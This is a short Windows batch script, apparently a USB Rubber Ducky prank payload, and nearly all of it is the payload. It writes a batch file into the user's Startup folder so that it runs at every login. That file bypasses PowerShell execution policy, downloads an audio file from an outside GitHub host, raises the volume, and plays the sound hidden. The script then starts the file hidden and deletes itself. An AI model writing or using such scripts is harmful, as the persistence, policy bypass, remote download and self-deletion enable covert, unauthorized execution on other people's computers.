@echo off
setlocal

set "desktop=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "nome_file=Avvia_cmd.bat"
set "percorso_file=%desktop%\%nome_file%"

(
    echo @echo off
    echo powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/USB-Rubber-Ducky1/PAYLOAD/raw/main/executable-main/audio.mp3' -OutFile '%desktop%\audio.mp3'; Start-Sleep -Seconds 60; for ($i=1; $i -le 60; $i++) { (New-Object -ComObject WScript.Shell).SendKeys([char]175) }; (New-Object -ComObject WScript.Shell).Run('wmplayer.exe \"%desktop%\suono.mp3\" /play /close', 0)"
) > "%percorso_file%"
powershell -Command "Start-Process -WindowStyle Hidden -FilePath '%percorso_file%'"
del "%~f0"
